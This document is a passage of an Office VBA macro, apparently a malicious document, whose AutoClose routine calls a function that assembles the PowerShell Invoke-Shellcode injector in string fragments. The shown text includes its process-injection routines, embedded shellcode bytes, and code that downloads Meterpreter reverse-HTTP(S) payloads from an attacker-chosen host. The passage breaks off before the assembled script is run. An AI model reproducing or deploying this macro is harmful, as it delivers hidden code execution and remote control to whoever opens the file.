Sub AutoClose()
        lAkR
End Sub

Public Function lAkR() As Variant
        Dim FW As String
        FW = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        FW = FW + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        FW = FW + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        FW = FW + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        FW = FW + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        FW = FW + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        FW = FW + "    $Shellcode,
    [Parameter( ParameterSetName ="
        FW = FW + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        FW = FW + "reter/reverse_http',
                  'windows/me"
        FW = FW + "terpreter/reverse_https',
                  Ignore"
        FW = FW + "Case = $True )]
    [String]
    $Payload = 'windo"
        FW = FW + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        FW = FW + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        FW = FW + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        FW = FW + " = $True,
                ParameterSetName = 'Meta"
        FW = FW + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        FW = FW + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        FW = FW + "datory = $True,
                ParameterSetName ="
        FW = FW + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        FW = FW + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        FW = FW + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        FW = FW + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        FW = FW + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        FW = FW + "sion\Internet Settings').'User Agent',
    [Parame"
        FW = FW + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        FW = FW + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        FW = FW + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        FW = FW + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        FW = FW + "$False,
    [Switch]
    $Force = $False
)
    Set"
        FW = FW + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        FW = FW + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        FW = FW + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        FW = FW + "meters['Payload'].Attributes |
            Where-O"
        FW = FW + "bject {$_.TypeId -eq [System.Management.Automation"
        FW = FW + ".ValidateSetAttribute]}
        foreach ($Payload "
        FW = FW + "in $AvailablePayloads.ValidValues)
        {
     "
        FW = FW + "       New-Object PSObject -Property @{ Payloads ="
        FW = FW + " $Payload }
        }
        Return
    }
    if "
        FW = FW + "( $PSBoundParameters['ProcessID'] )
    {
        "
        FW = FW + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        FW = FW + "-Null
    }
    function Local:Get-DelegateType
  "
        FW = FW + "  {
        Param
        (
            [OutputTyp"
        FW = FW + "e([Type])]
            [Parameter( Position = 0)]
"
        FW = FW + "            [Type[]]
            $Parameters = (Ne"
        FW = FW + "w-Object Type[](0)),
            [Parameter( Posit"
        FW = FW + "ion = 1 )]
            [Type]
            $ReturnT"
        FW = FW + "ype = [Void]
        )
        $Domain = [AppDomai"
        FW = FW + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        FW = FW + "t System.Reflection.AssemblyName('ReflectedDelegat"
        FW = FW + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        FW = FW + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        FW = FW + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        FW = FW + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        FW = FW + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        FW = FW + "der.DefineType('MyDelegateType', 'Class, Public, S"
        FW = FW + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        FW = FW + "egate])
        $ConstructorBuilder = $TypeBuilder"
        FW = FW + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        FW = FW + "ic', [System.Reflection.CallingConventions]::Stand"
        FW = FW + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        FW = FW + "mplementationFlags('Runtime, Managed')
        $Me"
        FW = FW + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        FW = FW + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        FW = FW + ", $Parameters)
        $MethodBuilder.SetImplement"
        FW = FW + "ationFlags('Runtime, Managed')
        Write-Outpu"
        FW = FW + "t $TypeBuilder.CreateType()
    }
    function Loc"
        FW = FW + "al:Get-ProcAddress
    {
        Param
        (
 "
        FW = FW + "           [OutputType([IntPtr])]
            [Par"
        FW = FW + "ameter( Position = 0, Mandatory = $True )]
       "
        FW = FW + "     [String]
            $Module,
            [Pa"
        FW = FW + "rameter( Position = 1, Mandatory = $True )]
      "
        FW = FW + "      [String]
            $Procedure
        )
  "
        FW = FW + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        FW = FW + ".GetAssemblies() |
            Where-Object { $_.G"
        FW = FW + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        FW = FW + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        FW = FW + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        FW = FW + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        FW = FW + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        FW = FW + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        FW = FW + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        FW = FW + "eropServices.HandleRef], [String]))
        $Kern3"
        FW = FW + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        FW = FW + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        FW = FW + "ndleRef = New-Object System.Runtime.InteropService"
        FW = FW + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        FW = FW + "Output $GetProcAddress.Invoke($null, @([System.Run"
        FW = FW + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        FW = FW + "ure))
    }
    function Local:Emit-CallThreadStub"
        FW = FW + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        FW = FW + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        FW = FW + "chitecture / 8
        function Local:ConvertTo-Li"
        FW = FW + "ttleEndian ([IntPtr] $Address)
        {
         "
        FW = FW + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        FW = FW + "           $Address.ToString("X$($IntSizePtr*2)") "
        FW = FW + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        FW = FW + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        FW = FW + " } }
            [System.Array]::Reverse($LittleEn"
        FW = FW + "dianByteArray)
            Write-Output $LittleEnd"
        FW = FW + "ianByteArray
        }
        $CallStub = New-Obj"
        FW = FW + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        FW = FW + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        FW = FW + "                   # MOV   QWORD RAX, &shellcode
 "
        FW = FW + "           $CallStub += ConvertTo-LittleEndian $Ba"
        FW = FW + "seAddr       # &shellcode
            $CallStub +="
        FW = FW + " 0xFF,0xD0                              # CALL  RA"
        FW = FW + "X
            $CallStub += 0x6A,0x00              "
        FW = FW + "                # PUSH  BYTE 0
            $CallSt"
        FW = FW + "ub += 0x48,0xB8                              # MOV"
        FW = FW + "   QWORD RAX, &ExitThread
            $CallStub +="
        FW = FW + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        FW = FW + "ead
            $CallStub += 0xFF,0xD0            "
        FW = FW + "                  # CALL  RAX
        }
        el"
        FW = FW + "se
        {
            [Byte[]] $CallStub = 0xB8"
        FW = FW + "                           # MOV   DWORD EAX, &she"
        FW = FW + "llcode
            $CallStub += ConvertTo-LittleEn"
        FW = FW + "dian $BaseAddr       # &shellcode
            $Cal"
        FW = FW + "lStub += 0xFF,0xD0                              # "
        FW = FW + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        FW = FW + "                        # PUSH  BYTE 0
           "
        FW = FW + " $CallStub += 0xB8                                "
        FW = FW + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        FW = FW + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        FW = FW + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        FW = FW + "                          # CALL  EAX
        }
  "
        FW = FW + "      Write-Output $CallStub
    }
    function Lo"
        FW = FW + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        FW = FW + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        FW = FW + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        FW = FW + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        FW = FW + "        Throw "Unable to open a process handle for"
        FW = FW + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        FW = FW + "lse
        if ($64bitCPU) # Only perform theses c"
        FW = FW + "hecks if CPU is 64-bit
        {
            $IsWo"
        FW = FW + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        FW = FW + "-Null
            if ((!$IsWow64) -and $PowerShell"
        FW = FW + "32bit)
            {
                Throw 'Unable"
        FW = FW + " to inject 64-bit shellcode from within 32-bit Pow"
        FW = FW + "ershell. Use the 64-bit version of Powershell if y"
        FW = FW + "ou want this to work.'
            }
            e"
        FW = FW + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        FW = FW + "  {
                if ($Shellcode32.Length -eq 0)"
        FW = FW + "
                {
                    Throw 'No s"
        FW = FW + "hellcode was placed in the $Shellcode32 variable!'"
        FW = FW + "
                }
                $Shellcode = $S"
        FW = FW + "hellcode32
            }
            else # 64-bit"
        FW = FW + " process
            {
                if ($Shellc"
        FW = FW + "ode64.Length -eq 0)
                {
            "
        FW = FW + "        Throw 'No shellcode was placed in the $She"
        FW = FW + "llcode64 variable!'
                }
            "
        FW = FW + "    $Shellcode = $Shellcode64
            }
      "
        FW = FW + "  }
        else # 32-bit CPU
        {
          "
        FW = FW + "  if ($Shellcode32.Length -eq 0)
            {
   "
        FW = FW + "             Throw 'No shellcode was placed in the"
        FW = FW + " $Shellcode32 variable!'
            }
           "
        FW = FW + " $Shellcode = $Shellcode32
        }
        $Remo"
        FW = FW + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        FW = FW + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        FW = FW + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        FW = FW + ")
        {
            Throw "Unable to allocate "
        FW = FW + "shellcode memory in PID: $ProcessID"
        }
   "
        FW = FW + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        FW = FW + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        FW = FW + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        FW = FW + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        FW = FW + "      {
            $CallStub = Emit-CallThreadStu"
        FW = FW + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        FW = FW + "    else
        {
            $CallStub = Emit-Ca"
        FW = FW + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        FW = FW + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        FW = FW + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        FW = FW + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        FW = FW + "(!$RemoteStubAddr)
        {
            Throw "Un"
        FW = FW + "able to allocate thread call stub memory in PID: $"
        FW = FW + "ProcessID"
        }
        $WriteProcessMemory.I"
        FW = FW + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        FW = FW + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        FW = FW + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        FW = FW + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        FW = FW + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        FW = FW + "  {
            Throw "Unable to launch remote thr"
        FW = FW + "ead in PID: $ProcessID"
        }
        $CloseHa"
        FW = FW + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        FW = FW + "on Local:Inject-LocalShellcode
    {
        if ($"
        FW = FW + "PowerShell32bit) {
            if ($Shellcode32.Le"
        FW = FW + "ngth -eq 0)
            {
                Throw 'N"
        FW = FW + "o shellcode was placed in the $Shellcode32 variabl"
        FW = FW + "e!'
                return
            }
         "
        FW = FW + "   $Shellcode = $Shellcode32
        }
        els"
        FW = FW + "e
        {
            if ($Shellcode64.Length -e"
        FW = FW + "q 0)
            {
                Throw 'No shell"
        FW = FW + "code was placed in the $Shellcode64 variable!'
   "
        FW = FW + "             return
            }
            $She"
        FW = FW + "llcode = $Shellcode64
        }
        $BaseAddre"
        FW = FW + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        FW = FW + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        FW = FW + "X)
        if (!$BaseAddress)
        {
          "
        FW = FW + "  Throw "Unable to allocate shellcode memory in PI"
        FW = FW + "D: $ProcessID"
        }
        [System.Runtime.I"
        FW = FW + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        FW = FW + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        FW = FW + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        FW = FW + "  if ($PowerShell32bit)
        {
            $Cal"
        FW = FW + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        FW = FW + "adAddr 32
        }
        else
        {
       "
        FW = FW + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        FW = FW + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        FW = FW + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        FW = FW + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        FW = FW + "X)
        if (!$CallStubAddress)
        {
      "
        FW = FW + "      Throw "Unable to allocate thread call stub.""
        FW = FW + "
        }
        [System.Runtime.InteropServices"
        FW = FW + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        FW = FW + "allStub.Length)
        $ThreadHandle = $CreateThr"
        FW = FW + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        FW = FW + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        FW = FW + "dHandle)
        {
            Throw "Unable to la"
        FW = FW + "unch thread."
        }
        $WaitForSingleObje"
        FW = FW + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        FW = FW + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        FW = FW + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        FW = FW + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        FW = FW + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        FW = FW + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        FW = FW + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        FW = FW + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        FW = FW + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        FW = FW + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        FW = FW + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        FW = FW + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        FW = FW + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        FW = FW + "  else
    {
        $64bitCPU = $false
    }
    "
        FW = FW + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        FW = FW + "l32bit = $true
    }
    else
    {
        $Power"
        FW = FW + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        FW = FW + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        FW = FW + "owerShell32bit) {
            $RootInvocation = $M"
        FW = FW + "yInvocation.Line
            $Response = $True
   "
        FW = FW + "         if ( $Force -or ( $Response = $psCmdlet.S"
        FW = FW + "houldContinue( "Do you want to launch the payload "
        FW = FW + "from x86 Powershell?",
                   "Attempt"
        FW = FW + " to execute 32-bit shellcode from 64-bit Powershel"
        FW = FW + "l. Note: This process takes about one minute. Be p"
        FW = FW + "atient! You will also see some artifacts of the sc"
        FW = FW + "ript loading in the other process." ) ) ) { }
    "
        FW = FW + "        if ( !$Response )
            {
          "
        FW = FW + "      Return
            }
            if ($MyInvo"
        FW = FW + "cation.BoundParameters['Force'])
            {
   "
        FW = FW + "             $Command = "function $($MyInvocation."
        FW = FW + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        FW = FW + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        FW = FW + "   }
            else
            {
              "
        FW = FW + "  $Command = "function $($MyInvocation.InvocationN"
        FW = FW + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        FW = FW + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        FW = FW + "
            $CommandBytes = [System.Text.Encoding"
        FW = FW + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        FW = FW + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        FW = FW + "           $Execute = '$Command' + " | $Env:windir"
        FW = FW + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        FW = FW + "oProfile -Command -"
            Invoke-Expression"
        FW = FW + " -Command $Execute | Out-Null
            Return
 "
        FW = FW + "       }
        $Response = $True
        if ( $F"
        FW = FW + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        FW = FW + "Do you know what you're doing?",
               "A"
        FW = FW + "bout to download Metasploit payload '$($Payload)' "
        FW = FW + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        FW = FW + "  if ( !$Response )
        {
            Return
 "
        FW = FW + "       }
        switch ($Payload)
        {
     "
        FW = FW + "       'windows/meterpreter/reverse_http'
        "
        FW = FW + "    {
                $SSL = ''
            }
    "
        FW = FW + "        'windows/meterpreter/reverse_https'
      "
        FW = FW + "      {
                $SSL = 's'
               "
        FW = FW + " [System.Net.ServicePointManager]::ServerCertifica"
        FW = FW + "teValidationCallback = {$True}
            }
     "
        FW = FW + "   }
        if ($Legacy)
        {
            $R"
        FW = FW + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        FW = FW + "
        } else {
            $CharArray = 48..57 "
        FW = FW + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        FW = FW + "         $SumTest = $False
            while ($Sum"
        FW = FW + "Test -eq $False)
            {
                $Ge"
        FW = FW + "neratedUri = $CharArray | Get-Random -Count 4
    "
        FW = FW + "            $SumTest = (([int[]] $GeneratedUri | M"
        FW = FW + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        FW = FW + "  }
            $RequestUri = -join $GeneratedUri
"
        FW = FW + "            $Request = "http$($SSL)://$($Lhost):$("
        FW = FW + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        FW = FW + "ew-Object Uri($Request)
        $WebClient = New-O"
        FW = FW + "bject System.Net.WebClient
        $WebClient.Head"
        FW = FW + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        FW = FW + "roxy)
        {
            $WebProxyObject = New-"
        FW = FW + "Object System.Net.WebProxy
            $ProxyAddre"
        FW = FW + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        FW = FW + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        FW = FW + "oxyServer
            if ($ProxyAddress)
         "
        FW = FW + "   {
                $WebProxyObject.Address = $Pr"
        FW = FW + "oxyAddress
                $WebProxyObject.UseDefa"
        FW = FW + "ultCredentials = $True
                $WebClientO"
        FW = FW + "bject.Proxy = $WebProxyObject
            }
      "
        FW = FW + "  }
        try
        {
            [Byte[]] $Sh"
        FW = FW + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        FW = FW + "}
        catch
        {
            Throw "$($Er"
        FW = FW + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        FW = FW + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        FW = FW + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        FW = FW + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        FW = FW + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        FW = FW + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        FW = FW + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        FW = FW + "                             0x52,0x0c,0x8b,0x52,0"
        FW = FW + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        FW = FW + "x31,0xc0,
                                  0xac,0"
        FW = FW + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        FW = FW + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        FW = FW + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        FW = FW + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        FW = FW + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        FW = FW + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        FW = FW + "x8b,
                                  0x01,0xd6,0"
        FW = FW + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        FW = FW + "x38,0xe0,0x75,0xf4,
                              "
        FW = FW + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        FW = FW + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        FW = FW + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        FW = FW + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        FW = FW + "                                  0x5b,0x5b,0x61,0"
        FW = FW + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        FW = FW + "xeb,0x86,0x5d,
                                  0"
        FW = FW + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        FW = FW + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        FW = FW + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        FW = FW + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        FW = FW + "                             0x80,0xfb,0xe0,0x75,0"
        FW = FW + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        FW = FW + "xd5,0x63,
                                  0x61,0"
        FW = FW + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        FW = FW + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        FW = FW + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        FW = FW + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        FW = FW + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        FW = FW + "                             0x20,0x48,0x8b,0x72,0"
        FW = FW + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        FW = FW + "x31,0xc0,
                                  0xac,0"
        FW = FW + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        FW = FW + "x41,0x01,0xc1,0xe2,0xed,
                         "
        FW = FW + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        FW = FW + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        FW = FW + "                        0x00,0x00,0x00,0x48,0x85,0"
        FW = FW + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        FW = FW + "x44,
                                  0x8b,0x40,0"
        FW = FW + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        FW = FW + "x8b,0x34,0x88,0x48,
                              "
        FW = FW + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        FW = FW + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        FW = FW + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        FW = FW + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        FW = FW + "                                  0x8b,0x40,0x24,0"
        FW = FW + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        FW = FW + "x40,0x1c,0x49,
                                  0"
        FW = FW + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        FW = FW + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        FW = FW + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        FW = FW + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        FW = FW + "                             0x59,0x5a,0x48,0x8b,0"
        FW = FW + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        FW = FW + "x00,0x00,
                                  0x00,0"
        FW = FW + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        FW = FW + "x00,0x41,0xba,0x31,0x8b,
                         "
        FW = FW + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        FW = FW + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        FW = FW + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        FW = FW + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        FW = FW + "x47,
                                  0x13,0x72,0"
        FW = FW + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        FW = FW + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        FW = FW + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
        FW = FW + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        FW = FW + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        FW = FW + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        FW = FW + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        FW = FW + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        FW = FW + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        FW = FW + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        FW = FW + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        FW = FW + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        FW = FW + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        FW = FW + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        FW = FW + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        FW = FW + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        FW = FW + "ernel32.dll WriteProcessMemory
        $WriteProce"
        FW = FW + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        FW = FW + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        FW = FW + "()) ([Bool])
        $WriteProcessMemory = [System"
        FW = FW + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        FW = FW + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        FW = FW + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        FW = FW + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        FW = FW + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        FW = FW + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        FW = FW + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        FW = FW + "eateRemoteThread = [System.Runtime.InteropServices"
        FW = FW + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        FW = FW + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        FW = FW + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        FW = FW + " CloseHandle
        $CloseHandleDelegate = Get-De"
        FW = FW + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        FW = FW + "le = [System.Runtime.InteropServices.Marshal]::Get"
        FW = FW + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        FW = FW + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        FW = FW + ".ShouldContinue( 'Do you wish to carry out your ev"
        FW = FW + "il plans?',
                 "Injecting shellcode "
        FW = FW + "injecting into $((Get-Process -Id $ProcessId).Proc"
        FW = FW + "essName) ($ProcessId)!" ) )
        {
            "
        FW = FW + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        FW = FW + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        FW = FW + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        FW = FW + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        FW = FW + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        FW = FW + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        FW = FW + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        FW = FW + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        FW = FW + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        FW = FW + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        FW = FW + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
